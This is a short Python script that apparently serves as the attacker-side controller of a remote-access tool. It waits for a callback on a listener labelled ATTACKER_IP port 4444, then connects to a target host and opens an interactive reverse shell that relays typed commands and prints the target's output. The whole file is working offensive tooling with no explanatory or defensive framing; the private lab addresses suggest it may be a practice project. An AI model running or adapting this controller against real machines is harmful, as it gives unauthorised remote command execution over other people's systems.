import socket
from time import sleep


TARGET_IP = "192.168.68.107"
TARGET_PORT = 8080

ATTACKER_IP = "192.168.68.100"
ATTACKER_PORT = 4444

def awaitConfirmation():
    # | 1.src addr | 2. skt init | 3.bind | 4.listen | 5.new skt | 6.recv | 7.sendall |

    print("[*] Init stage 1")

    sktrec = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    sktrec.bind((ATTACKER_IP, ATTACKER_PORT))
    try:
        print("[*] Waiting for connection")
        sktrec.listen(1)

        conn, addr = sktrec.accept()
        print(f"[*] Connection established with {addr}")

        message = conn.recv(1024).decode("utf-8") #
        print(f" > {message}")

        conn.close()
    except socket.error as e:
        print(f"[!] Could not connect to server {e}")
    finally:
        sktrec.close()

def sendCommand():
    # | 1. dst addr | 2. skt | 3. connect | 4. sendall
    print("[>>>] stage 2")


    skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        skt.connect((TARGET_IP, TARGET_PORT))
        print("[*] Connection established")

        response = skt.recv(1024).decode("utf-8")
        print(f" > {response}")

        mainMenu(skt)


    except socket.error as e:
        print(f"[!] Could not connect to server {e}")

def mainMenu(skt):
    print("[*] Main Menu")
    RUN = True
    while RUN:

        message = input("Enter your message: ")

        if message == "exit":
            skt.sendall(message.encode("utf-8"))
            RUN = False
            skt.close()

        elif message == "rs":
            skt.sendall(message.encode("utf-8"))

            response = skt.recv(1024).decode("utf-8")
            print(f" > {response}")
            reverseShell(skt)
            print("[*] Back to menu")
        else:
            print("[!] Command was not recognised, try again...")

def reverseShell(skt):

    skt.settimeout(0.2)
    try:
        print(skt.recv(1024).decode("utf-8"), end="")
    except:
        pass
    skt.settimeout(None)


    while True:

        command = input("")

        skt.sendall((command+"\n").encode("utf-8"))
        sleep(1)

        print("\033[2K", end='\r')
        while True:

            try:
                skt.settimeout(0.1)
                data = skt.recv(4096)
                if not data:
                    break
                if data.decode("utf-8") != (command+"\n"):
                    print(data.decode("utf-8"), end="", flush=True)
            except socket.timeout:
                break

        if command == "exit":
            print()
            break

    skt.settimeout(None)



awaitConfirmation()
sendCommand()



